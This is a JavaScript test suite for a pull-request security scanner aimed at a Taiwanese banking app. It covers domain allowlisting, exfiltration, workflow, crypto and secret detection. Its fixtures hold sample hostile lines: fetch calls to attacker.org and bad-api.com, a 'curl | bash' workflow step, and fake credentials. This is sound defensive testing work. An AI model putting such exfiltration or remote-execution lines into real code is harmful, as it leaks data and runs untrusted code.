import assert from "node:assert/strict";
import test from "node:test";
import {
  formatAiResponse,
  generateSecurityReport,
  isApprovedDomain,
  parseCliArgs,
  parseUnifiedDiff,
  postPrComment,
  runSecurityReview,
  scanCryptoAndKeyIntegrity,
  scanDataExfiltration,
  scanHardcodedSecrets,
  scanSecurityRules,
  scanWorkflowSecurity,
} from "./review-pr-security.mjs";

test("isApprovedDomain: 正確辨識核准之台灣金融機構與官方 API 網域", () => {
  // 台灣金融機構與官方網域
  assert.equal(isApprovedDomain("eb.ctbcbank.com"), true);
  assert.equal(isApprovedDomain("ctbcbank.com"), true);
  assert.equal(isApprovedDomain("www.cathaybk.com.tw"), true);
  assert.equal(isApprovedDomain("cathaybk.com.tw"), true);
  assert.equal(isApprovedDomain("api.sinopac.com"), true);
  assert.equal(isApprovedDomain("bank.esunbank.com"), true);
  assert.equal(isApprovedDomain("richart.taishinbank.com.tw"), true);
  assert.equal(isApprovedDomain("mbanking.skbank.com.tw"), true);
  assert.equal(isApprovedDomain("www.o-bank.com"), true);
  assert.equal(isApprovedDomain("netbank.hncb.com.tw"), true);
  assert.equal(isApprovedDomain("ibank.firstbank.com.tw"), true);
  assert.equal(isApprovedDomain("ebank.kgibank.com.tw"), true);
  assert.equal(isApprovedDomain("uia.einvoice.nat.gov.tw"), true);
  assert.equal(isApprovedDomain("epassbooksys.tdcc.com.tw"), true);
  assert.equal(isApprovedDomain("cloudflareaccess.com"), true);
  assert.equal(isApprovedDomain("myteam.cloudflareaccess.com"), true);

  // 既有基礎設施與測試網域
  assert.equal(isApprovedDomain("invoiceapp.nat.gov.tw"), true);
  assert.equal(
    isApprovedDomain("digitalprocesssys-epassbook.cdn.hinet.net"),
    true,
  );
  assert.equal(isApprovedDomain("localhost"), true);
  assert.equal(isApprovedDomain("127.0.0.1"), true);
  assert.equal(isApprovedDomain("fake-test.test"), true);
  assert.equal(isApprovedDomain("openudid.org"), true);

  // 未核准的外部或惡意網域
  assert.equal(isApprovedDomain("evil-exfil.com"), false);
  assert.equal(isApprovedDomain("attacker.org"), false);
  assert.equal(isApprovedDomain("phishing-cathaybk.com"), false);
  assert.equal(isApprovedDomain("cathaybk.com.tw.attacker.com"), false);
  assert.equal(isApprovedDomain(null), false);
  assert.equal(isApprovedDomain(""), false);
});

test("Rule 1 (Data Exfiltration): 偵測未核准的外部連線位址", () => {
  const maliciousDiff = `
diff --git a/apps/worker/src/connectors/leak.ts b/apps/worker/src/connectors/leak.ts
--- a/apps/worker/src/connectors/leak.ts
+++ b/apps/worker/src/connectors/leak.ts
@@ -10,2 +10,4 @@
+const exfil = "https://attacker.org/collect";
+const response = await fetch("https://bad-api.com/steal?data=123");
`;
  const fileDiffs = parseUnifiedDiff(maliciousDiff);
  const findings = scanDataExfiltration(fileDiffs);

  assert.equal(findings.length, 2);
  assert.equal(findings[0].level, "HIGH");
  assert.equal(findings[0].rule, "外部連線外洩檢測 (Data Exfiltration)");
  assert.match(findings[0].message, /attacker\.org/);
  assert.match(findings[1].message, /bad-api\.com/);
});

test("Rule 1 (Data Exfiltration): 核准之台灣金融 API 與相對路徑不觸發警報", () => {
  const safeDiff = `
diff --git a/apps/worker/src/connectors/ctbc.ts b/apps/worker/src/connectors/ctbc.ts
--- a/apps/worker/src/connectors/ctbc.ts
+++ b/apps/worker/src/connectors/ctbc.ts
@@ -5,3 +5,4 @@
+const CTBC_ORIGIN = "https://eb.ctbcbank.com/IMP";
+const internalData = await fetch("/api/accounts/balance");
`;
  const fileDiffs = parseUnifiedDiff(safeDiff);
  const findings = scanDataExfiltration(fileDiffs);

  assert.equal(findings.length, 0);
});

test("Rule 1 (Data Exfiltration): 偵測未核准之 WebSocket 連線", () => {
  const wsDiff = `
diff --git a/apps/worker/src/stream.ts b/apps/worker/src/stream.ts
--- a/apps/worker/src/stream.ts
+++ b/apps/worker/src/stream.ts
@@ -1,2 +1,3 @@
+const socket = new WebSocket("wss://unauthorized-stream.org/data");
`;
  const fileDiffs = parseUnifiedDiff(wsDiff);
  const findings = scanDataExfiltration(fileDiffs);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].level, "HIGH");
  assert.match(findings[0].message, /unauthorized-stream\.org/);
});

test("Rule 2 (Crypto & Key Integrity): 偵測核心安全性或加密模組檔案修改", () => {
  const changedFiles = [
    "apps/worker/src/platform/crypto.ts",
    "apps/worker/src/routes/user.ts",
  ];
  const diffText = `
diff --git a/apps/worker/src/platform/crypto.ts b/apps/worker/src/platform/crypto.ts
--- a/apps/worker/src/platform/crypto.ts
+++ b/apps/worker/src/platform/crypto.ts
@@ -1,2 +1,3 @@
+// updated comment
`;
  const fileDiffs = parseUnifiedDiff(diffText);
  const findings = scanCryptoAndKeyIntegrity(changedFiles, fileDiffs);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].level, "HIGH");
  assert.equal(
    findings[0].rule,
    "加密與金鑰完整性檢測 (Crypto & Key Integrity)",
  );
  assert.match(findings[0].message, /apps\/worker\/src\/platform\/crypto\.ts/);
});

test("Rule 2 (Crypto & Key Integrity): 偵測修改關鍵加密參數與 API", () => {
  const changedFiles = ["apps/worker/src/services/secret-service.ts"];
  const diffText = `
diff --git a/apps/worker/src/services/secret-service.ts b/apps/worker/src/services/secret-service.ts
--- a/apps/worker/src/services/secret-service.ts
+++ b/apps/worker/src/services/secret-service.ts
@@ -1,3 +1,5 @@
+const secretKey = env.CONFIG_ENCRYPTION_KEY;
+const result = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, data);
`;
  const fileDiffs = parseUnifiedDiff(diffText);
  const findings = scanCryptoAndKeyIntegrity(changedFiles, fileDiffs);

  assert.equal(findings.length, 3);
  const messages = findings.map((f) => f.message).join(" ");
  assert.match(messages, /CONFIG_ENCRYPTION_KEY/);
  assert.match(messages, /AES-GCM/);
  assert.match(messages, /crypto\.subtle/);
});

test("Rule 3 (Workflow & Permissions Security): 偵測工作流程篡改、permissions、id-token 與 curl|bash", () => {
  const workflowDiff = `
diff --git a/.github/workflows/deploy.yml b/.github/workflows/deploy.yml
--- a/.github/workflows/deploy.yml
+++ b/.github/workflows/deploy.yml
@@ -10,3 +10,7 @@
+  permissions:
+    id-token: write
+    contents: read
+    run: curl -sSL https://get.pwn.sh | bash
+    uses: actions/checkout@v4
`;
  const fileDiffs = parseUnifiedDiff(workflowDiff);
  const findings = scanWorkflowSecurity(fileDiffs);

  assert.equal(findings.length, 4);
  const messages = findings.map((f) => f.message).join(" ");
  assert.match(messages, /permissions/);
  assert.match(messages, /id-token: write/);
  assert.match(messages, /curl \| bash/);
  assert.match(messages, /actions\/checkout@v4/);
});

test("Rule 3 (Workflow & Permissions Security): 鎖定 40 碼 SHA 之 Action 不觸發警報", () => {
  const workflowDiff = `
diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -5,2 +5,3 @@
+    uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.6
+    uses: ./.github/actions/local-setup
`;
  const fileDiffs = parseUnifiedDiff(workflowDiff);
  const findings = scanWorkflowSecurity(fileDiffs);

  assert.equal(findings.length, 0);
});

test("Rule 4 (Hardcoded Secrets): 偵測硬編碼私鑰、API 金鑰、Token 與密碼", () => {
  const secretDiff = `
diff --git a/apps/worker/src/keys.ts b/apps/worker/src/keys.ts
--- a/apps/worker/src/keys.ts
+++ b/apps/worker/src/keys.ts
@@ -1,2 +1,6 @@
+const rsaKey = "-----BEGIN RSA PRIVATE KEY-----\\nMIIEowIBAAKCAQEA...";
+const awsKey = "AKIAIOSFODNN7EXAMPLE";
+const githubToken = "ghp_123456789012345678901234567890123456";
+const plainPassword = "SuperSecretDbPassword2026!";
`;
  const fileDiffs = parseUnifiedDiff(secretDiff);
  const findings = scanHardcodedSecrets(fileDiffs);

  assert.equal(findings.length, 4);
  assert.equal(
    findings.every((f) => f.level === "HIGH"),
    true,
  );
  const messages = findings.map((f) => f.message).join(" ");
  assert.match(messages, /私鑰/);
  assert.match(messages, /AWS Access Key/);
  assert.match(messages, /GitHub Token/);
  assert.match(messages, /密碼/);
});

test("Rule 4 (Hardcoded Secrets): 常見 Placeholder 不誤報", () => {
  const placeholderDiff = `
diff --git a/apps/worker/src/config.ts b/apps/worker/src/config.ts
--- a/apps/worker/src/config.ts
+++ b/apps/worker/src/config.ts
@@ -1,2 +1,4 @@
+const dummyPassword = "temporary-placeholder";
+const placeholderKey = "your-api-key";
`;
  const fileDiffs = parseUnifiedDiff(placeholderDiff);
  const findings = scanHardcodedSecrets(fileDiffs);

  assert.equal(findings.length, 0);
});

test("scanSecurityRules: 完全無害之商業邏輯變更評定為 🟢 通過", () => {
  const cleanDiff = `
diff --git a/packages/core/src/calc.ts b/packages/core/src/calc.ts
--- a/packages/core/src/calc.ts
+++ b/packages/core/src/calc.ts
@@ -1,3 +1,6 @@
+export function calculateInterest(principal: number, rate: number): number {
+  return principal * rate;
+}
`;
  const results = scanSecurityRules({
    changedFiles: ["packages/core/src/calc.ts"],
    diffText: cleanDiff,
  });

  assert.equal(results.overallRating, "PASS");
  assert.match(results.overallRatingText, /🟢 通過/);
  assert.equal(results.findings.length, 0);
});

test("generateSecurityReport: 產出結構符合規範之正體中文 Markdown 報告", () => {
  const scanResults = {
    overallRating: "ALERT",
    overallRatingText: "🔴 警報 (發現高風險項目)",
    summary: {
      totalFiles: 2,
      sensitiveFilesCount: 1,
      highRiskCount: 1,
      warningCount: 0,
    },
    sensitiveFiles: ["apps/worker/src/platform/crypto.ts"],
    findings: [
      {
        rule: "加密與金鑰完整性檢測 (Crypto & Key Integrity)",
        level: "HIGH",
        file: "apps/worker/src/platform/crypto.ts",
        lineNumber: 12,
        message:
          "核心安全性或加密模組檔案遭修改: apps/worker/src/platform/crypto.ts",
        snippet: "+ const modified = true;",
      },
    ],
  };

  const report = generateSecurityReport({
    prNumber: "88",
    scanResults,
    aiReviewText: "經過進一步比對，確認此變更無惡意意圖，但需由負責人複審。",
  });

  assert.match(report, /# 🛡️ OpenCode 自動安全審查報告 \(PR #88\)/);
  assert.match(report, /\*\*總體安全評級\*\*: 🔴 警報 \(發現高風險項目\)/);
  assert.match(report, /## 1\. 變更統計與敏感檔案追蹤/);
  assert.match(report, /apps\/worker\/src\/platform\/crypto\.ts/);
  assert.match(report, /## 2\. 靜態規則掃描結果/);
  assert.match(report, /### 🔴 高風險項目 \(1 項\)/);
  assert.match(report, /## 3\. 安全建議與注意事項/);
  assert.match(report, /## 4\. AI 智能安全深度分析/);
  assert.match(report, /經過進一步比對/);
});

test("parseCliArgs: 正確解析命令列參數", () => {
  const args = [
    "--pr",
    "42",
    "--base",
    "origin/feature",
    "--head",
    "HEAD",
    "--dry-run",
    "--no-ai",
  ];
  const parsed = parseCliArgs(args);

  assert.equal(parsed.pr, "42");
  assert.equal(parsed.base, "origin/feature");
  assert.equal(parsed.head, "HEAD");
  assert.equal(parsed.dryRun, true);
  assert.equal(parsed.noAi, true);
});

test("postPrComment: 在 dry-run 模式下不執行 PR 留言", async () => {
  let commentCalled = false;
  const mockRunner = (cmd, args) => {
    if (cmd === "git") {
      return { status: 0, stdout: "test.ts\n", stderr: "" };
    }
    if (cmd === "gh" || args.includes("comment")) {
      commentCalled = true;
      return { status: 0, stdout: "", stderr: "" };
    }
    return { status: 0, stdout: "", stderr: "" };
  };

  await runSecurityReview(["--pr", "99", "--dry-run", "--no-ai"], {
    runner: mockRunner,
    skipAi: true,
  });

  assert.equal(commentCalled, false);
});

test("postPrComment: 在非 dry-run 且指定 --pr 時呼叫 gh pr comment", async () => {
  const calls = [];
  const mockRunner = (cmd, args) => {
    calls.push({ cmd, args });
    if (cmd === "git") {
      return { status: 0, stdout: "test.ts\n", stderr: "" };
    }
    return {
      status: 0,
      stdout: "https://github.com/org/repo/pull/99#comment",
      stderr: "",
    };
  };

  const commentBody = "Test report";
  postPrComment("99", commentBody, { runner: mockRunner });

  const ghCall = calls.find((c) => c.args.includes("comment"));
  assert.ok(ghCall);
  assert.deepEqual(ghCall.args.slice(0, 4), [
    "pr",
    "comment",
    "99",
    "--body-file",
  ]);
});

test("formatAiResponse: 正確處理普通 Chat 回應與 DeepSeek-R1 推理思考過程", () => {
  // 1. 一般 Chat 模型回應
  assert.equal(formatAiResponse({ content: "無安全漏洞" }), "無安全漏洞");

  // 2. DeepSeek-R1 reasoning_content 物件
  const r1Response = formatAiResponse({
    content: "分析結論：此變更安全。",
    reasoning_content: "首先檢視 diff 是否有危險呼叫...",
  });
  assert.match(r1Response, /<details>/);
  assert.match(r1Response, /💭 展開 DeepSeek 推理思考過程/);
  assert.match(r1Response, /首先檢視 diff 是否有危險呼叫/);
  assert.match(r1Response, /分析結論：此變更安全。/);

  // 3. 含 <think> 標籤之純文字（CLI 輸出格式）
  const thinkText = "<think>思考連線安全性...</think>\n審查通過。";
  const formattedThink = formatAiResponse(thinkText);
  assert.match(formattedThink, /<details>/);
  assert.match(formattedThink, /思考連線安全性/);
  assert.match(formattedThink, /審查通過。/);

  // 4. 空值與無效內容保護
  assert.equal(formatAiResponse(null), null);
  assert.equal(formatAiResponse(""), null);
});
